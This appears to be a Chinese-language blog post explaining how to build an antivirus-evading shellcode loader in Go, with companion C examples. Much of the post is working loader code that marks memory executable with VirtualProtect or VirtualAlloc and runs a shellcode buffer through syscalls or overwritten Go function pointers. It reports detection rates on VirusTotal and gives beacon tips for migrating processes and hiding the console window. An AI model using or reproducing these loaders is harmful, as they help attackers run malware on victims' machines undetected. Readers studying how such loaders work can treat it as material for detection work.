---
layout: post
title: Golang动态加载shellcode
summary: Golang修改页保护属性绕过DEP，通过syscall或pointer cast执行，实现分离免杀
featured-img: go-shellcode-loader
---

加载器repo：https://github.com/EddieIvan01/gld

本文相关的代码可以在https://github.com/EddieIvan01/gld/tree/master/sample找到

## 在C/Cpp中动态加载shellcode

简述C/Cpp动态加载shellcode

### Cast char array ptr to function ptr

低版本系统中将函数指针指向shellcode数据段就OK了，或者在VS编译X86时嵌入asm

```c
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

unsigned char buf[] = {...};

int main() {
    ((void(*)(void))&buf)();
    
    // ((void(WINAPI*)(void))&buf)();
    
    /*
    __asm {
        mov eax, offset buf
        jmp eax
    }
    */
}
```

### Win32API VirtualProtect

高版本中默认开启DEP(Data Execution Prevention)，数据段默认仅有RW权限，代码段为READONLY权限

```c
// constants
#define PAGE_NOACCESS           0x01    
#define PAGE_READONLY           0x02    
#define PAGE_READWRITE          0x04    
#define PAGE_WRITECOPY          0x08    
#define PAGE_EXECUTE            0x10    
#define PAGE_EXECUTE_READ       0x20    
#define PAGE_EXECUTE_READWRITE  0x40    
#define PAGE_EXECUTE_WRITECOPY  0x80 

// function signature
BOOL VirtualProtect{ 
    LPVOID lpAddress,
    DWORD dwsize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
}
```

调用Win32API的VirtualProtect修改数据段为PAGE_EXECUTE_READ权限，或增加预编译指令修改数据段权限

**修改成RX权限就足够了，RWX内存块太敏感。实际上，仅仅PAGE_EXECUTE权限也是可以正常执行的，X和RX行为类似：[SO](https://stackoverflow.com/questions/47969670/whats-the-difference-between-page-execute-and-page-execute-read)**

```c
void(*fn)(void);
fn = (void(*)(void)) & buf;

DWORD oldperm;
if (!VirtualProtect(&buf, sizeof buf, 0x20, &oldperm)) 
    return -1;
fn();


/*=======================================================*/
    

#pragma comment(linker, "/section:.data,RWE")
```

### Win32API VirtualAlloc

另一种方法：使用VirtualAlloc分配指定权限的内存块

```c
// function signature
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

```c
LPVOID lpAlloc = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READ);
memcpy(lpAlloc, buf, sizeof buf);
((void(*)())lpAlloc)();
```

### Nt(Zw)ProtectVirtualMemory/Nt(Zw)AllocateVirtualMemory

ntdll的非导出函数，是上文两个函数在R3的最底层，多了个process handle参数，

R3下的`Nt*`和`Zw*`没区别，之所以写`Nt(Zw)`，因为说不定AV的黑名单不全 :)

## 在Go中动态加载shellcode

需要说明的是，**在Go中，VirtualAlloc和VirtualProtect都有可能出现未预期错误**

比如VA，因为分配的内存仅由uintptr指向（无指针语义），在GC眼里无变量使用，可回收

对于VP，byte切片的底层数组分配在堆上，MSDN提到

> It is best to avoid using VirtualProtect to change page protections on memory blocks allocated by GlobalAlloc, HeapAlloc, or LocalAlloc, because multiple memory blocks can exist on a single page. The heap manager assumes that all pages in the heap grant at least read and write access.

修改页保护属性为无R/W权限后，当分配的堆上新内存正好在当前页时会崩

go1.14，`fmt.Println(virtuaProtect(...))`可以稳定复现，跟踪到`src/runtime/malloc.go#1015`：

```go
span := c.alloc[tinySpanClass]
v := nextFreeFast(span)
if v == 0 {
    v, _, shouldhelpgc = c.nextFree(tinySpanClass)
}
x = unsafe.Pointer(v)
(*[2]uint64)(x)[0] = 0
(*[2]uint64)(x)[1] = 0
```

### Invoke VirtualProtect & VirtualAlloc in Go

通过Go加载shellcode效果很不错，stageless shellcode能轻松过360和火绒，VirusTotal基本6/70左右的查杀率

Go加载kernel32.dll，调用VirtualProtect，修改byte slice的内存块权限

```go
var virtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

var oldperm uint32
virtualProtect.Call(
    uintptr(unsafe.Pointer(&buf[0])),
    uintptr(len(buf)),
    uintptr(0x20),
    uintptr(unsafe.Pointer(&oldperm)),
)
syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
```

要注意的是，Golang里的byte slice指针实际指向的是SliceHeader结构体，加载shellcode时需要获取底层存储数组的指针，这样才能到达shellcode的入口。以下两种方式是等效的

```
(*reflect.SliceHeader)(unsafe.Pointer(&buf)).Data
&buf[0]
```

Go调用VirtualProtect，自己实现memcpy函数，最后也是通过syscall来调用

```go
var virtualAlloc = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

addr, _, err := virtualAlloc.Call(0, uintptr(len(buf)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READ)
if addr == 0 {
    panic(err)
}
memcpy(addr, buf)
syscall.Syscall(addr, 0, 0, 0, 0)
```

### (题外话：uintptr没有指针语义

上面调用VirtualAlloc的方式其实是不严谨的，因为VirtualAlloc返回了uintptr，而uintptr没有指针语义，即该内存块引用计数为0，随时可能被GC掉（但其实对于这种加载Shellcode的场景问题不大）

那么只需要使用一个Go的类型来承接，第一个想到的是byte数组，但由于编译期不知道shellcode长度，所以需要预先分配一块大内存，这样写感觉不太清真

```go
ptr := (*[990000]byte)(unsafe.Pointer(addr))
for i, _ := range buf {
    ptr[i] = buf[i]
}
```

那么自然想到通过动态分配的Slice来做，将SliceHeader指向底层数组的指针修改为分配的内存块指针，寄希望于GC处理Slice时会考虑它引用的底层数组

```go
shellcode := make([]byte, len(buf), len(buf))
(*(*reflect.SliceHeader)(unsafe.Pointer(&buf))).Data = address
for i, _ := range buf {
    shellcode[i] = buf[i]
}
```

但很遗憾，`reflect.SliceHeader`的注释说的很明白

> Moreover, the Data field is not sufficient to guarantee the data it references will not be garbage collected, so programs must keep a separate, correctly typed pointer to the underlying data.

实验一下：

```go
func T1() []int {
    fmt.Println("T1")
    x := [64]int{}
    fmt.Println(x)

    return x[:]
}

func T2() []int {
    fmt.Println("T2")
    x := [64]int{}
    fmt.Println(x)

    tmp := reflect.SliceHeader{
        (uintptr)(unsafe.Pointer(&x[0])), 64, 64,
    }
    return *(*[]int)(unsafe.Pointer(&tmp))
}

func main() {
    x := T1()
    runtime.GC()
    fmt.Println(x)

    x = T2()
    runtime.GC()
    fmt.Println(x)
}
```

OUTPUT：

```
T1
[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]
[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]
T2
[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]
[0 2 824634301200 4234250 4938528 4894336 1 0 824634301824 4826714 4938528 4894336 824633737280 0 0 0 0 0 0 0 4894336 0 0 0 0 0 23 824634301824 4831950 824634042608 4900672 824634301384 386 118 1 386 196608 0 3940709804408846 48 8 0 14680288 17193013920 8192 13152216 60130459662 824634301544 0 32 33751040 33751040 5140577 53 0 8 4961728 13152216 824634301760 4242256 23 1024 1024 4958720]
```

所以如果为了绝对的内存安全，貌似只有上面那种不清真的做法可行

### Execute shellcode by syscall.Syscall

看到上面两个例子都是通过`syscall.Syscall`执行shellcode

```go
syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
```

`syscall.Syscall`实际链接了`runtime/syscall_windows.go`中的`syscall_Syscall`函数，是通过CGO来调用的。CGO有很多缺点，包括性能问题，无法交叉编译，无法完全静态编译，所以我希望通过pointer cast来调用

### Cast byte array ptr to function ptr in Go

Go也有指针，能否像C/Cpp一样`(*((void(*)(void))&buf))()`来调用shellcode？

改写成Go

```go
(*(*func())(unsafe.Pointer(&buf[0])))()
```

运行后crash了，我们需要知道几件事

C/Cpp里之所以可以通过强转指针来执行，是因为C/Cpp这种原始语言里的函数实际是一个地址，跳转到入口地址即可

Go里的函数是个first-class，而且函数对象中并不仅仅包含指针，还包含defer定义的函数栈，所以我们将byte array的指针强转为函数指针这种做法自然不行

### Go runtime中的函数元信息结构

实际上Go中的函数对象在runtime中的数据结构是这样（src/runtime/runtime2.go），和slice相同，第一个成员都是指针

```go
type _func struct {
	entry   uintptr // start pc
	nameoff int32   // function name

	args        int32  // in/out args size
	deferreturn uint32 // offset of a deferreturn block from entry, if any.

	pcsp      int32
	pcfile    int32
	pcln      int32
	npcdata   int32
	funcID    funcID  // set for certain special runtime functions
	_         [2]int8 // unused
	nfuncdata uint8   // must be last
}
```

这里提一下踩的坑，开始猜想Golang底层用`struct _func`来存储first-class function，但经过以下测试后发现不对，args参数对不上

```go
f := func(a int) {}
fmt.Println((*_func)(unsafe.Pointer(&f)))

            
/*
OUTPUT
&{5174256 5832352 0 0 0 0 0 0 0 [0 0] 0}
*/       
```

多解引一层？确实拿到了PC地址，但还是不对。打印出来的内存实际上是GO维护的函数PC table，后文会讲

```go
fmt.Println(*(**_func)(unsafe.Pointer(&f)))


/*
OUTPUT 
&{4890032 4831504 0 4831664 0 4818512 0 4818640 0 [0 0] 0}
*/
```

通过runtime包拿到真正的`struct _func`信息：

```go
f := func() uintptr {
    pc, _, _, _ := runtime.Caller(0)
    return pc
}
pc := f()
info := (*_func)(unsafe.Pointer(runtime.FuncForPC(pc)))
fmt.Println(info)


/*
OUTPUT
&{4890032 485296 8 0 485340 485347 485351 2 0 [0 0] 3}
*/
```

尝试直接修改会报错，此处因为在代码段默认只是READONLY权限

```go
info.entry = (uintptr)(unsafe.Pointer(&buf[0]))
```

使用VirtualProtect修改，并打印oldperm。成功执行，打印出来oldperm为2，对应READONLY，验证我们的猜想

```go
var oldperm uint32
virtualProtect.Call(
    uintptr(unsafe.Pointer(info)),
    uintptr(unsafe.Sizeof(*info)),
    uintptr(0x20),
    uintptr(unsafe.Pointer(&oldperm)),
)

println(oldperm)
info.entry = (uintptr)(unsafe.Pointer(&buf[0]))
```

但修改后并不能覆盖f，因为`_func`并不是实际的first-class对象，而只是runtime用来记录函数元信息的结构

### Go中的first-class函数对象是一个双重指针

IDA里跟踪以下代码输出的地址

```go
f := func() {}
fmt.Println(*(*uintptr)(unsafe.Pointer(&f)))
fmt.Println(**(**uintptr)(unsafe.Pointer(&f)))

/*
OUTPUT
5169560
4889760
*/
```

5169560地址指向了4889760，5169560处的内存块处都是函数的入口地址表

```
off_4DA668      dq offset main_main_func1
off_4DA670      dq offset os___file__close
off_4DA678      dq offset reflect_cvtBytesString
off_4DA680      dq offset reflect_cvtComplex
off_4DA688      dq offset reflect_cvtDirect
off_4DA690      dq offset reflect_cvtFloatInt
off_4DA698      dq offset reflect_cvtFloatUint
```

**通过查看内存结构，Go中的first-class function是一个双重指针，解引两次后到达函数入口（也就是相比C/Cpp的函数指针需要多一次解引）；直接`func x() {}`定义的函数不可取址，且不在PC table中存储入口地址，它实际就代表了函数自身**

比如下面的例子，你应该能通过IDA里看到表中有`main_main_func1`，`main_X`，而表内没有`main_Y`（与内联与否无关）

```go
func X() {}

func Y() {}

func main() {
    Z := func() {}
    x := X
}
```

直接定义的函数是不可寻址的，如果硬要取它的地址，只能通过反射

```go
func X() {}

func main() {
    x := X
    println(*(*uintptr)(unsafe.Pointer(&x)))
    println(**(**uintptr)(unsafe.Pointer(&x)))
    fmt.Println(reflect.ValueOf(X).Pointer())
}


/*
OUTPUT
5088224
4827056
4827056
*/
```

可以看到X的地址就是机器码中函数的入口地址，而first-class的函数对象则是一个指向PC table中函数入口地址的指针

IDA里看一下，把`&f`识别为了三重指针`void(***f)()`

```assembly
lea     rcx, off_4DA638  ;; off_4DA638是f函数的入口地址
mov     [rax], rcx
...
mov     rax, [rsp+60h+var_20]
mov     rdx, [rax]
mov     rax, [rdx]
call    rax


// F5
__int64 (***v2)(void);
return (**v2)();
```

搞懂这些后，如何cast the pointer就很简单了：

```go
var ptr uintptr = (uintptr)(unsafe.Pointer(&buf[0]))
*(*uintptr)(unsafe.Pointer(&f)) = (uintptr)(unsafe.Pointer(&ptr))
```

上面的做法是修改第一层指针也就是`f`本身，当然也可以修改第二层指针也就是`f`指向的函数真实入口地址，但因为第二层指针是READONLY权限，不同于`f`的READWRITE，直接运行会crash，所以还需要调用VirtualProtect修改指针的权限

```go
virtualProtect.Call(
    *(*uintptr)(unsafe.Pointer(&f)),
    uintptr(unsafe.Sizeof(**(**uintptr)(unsafe.Pointer(&f)))),
    uintptr(0x20),
    uintptr(unsafe.Pointer(&oldperm)),
)

**(**uintptr)(unsafe.Pointer(&f)) = (uintptr)(unsafe.Pointer(&buf[0]))
```

## ShellCode Loader

实现一个加载器很简单，将shellcode加密后动态加载

但问题出在，上述cast pointer的做法在x64下有概率出现内存错误（我仅会在x64下加载stageless shellcode时遇到），原因我猜是因为uintptr没有指针语义，例如`fmt.Fprint`内部buffer有可能破坏它的内存（以前遇到过一个fmt的buffer memory leak）

所以一般情况下使用x86 shellcode + pointer cast是没有问题的，在x64下为了稳还是使用syscall加载比较好

加载器还内置了检测沙盒功能，具体细节见README

***

加载生成的shellcode二进制打开后就是一个黑窗，可能还没来得及migrate process对方就关闭了。

解决的办法

+ 在`initial_beacon`中设置auto migrate，但还得连带把initial sleep设置成尽可能短
+ 添加编译选项，打开直接后台执行：`-ldflags="-H windowsgui"`
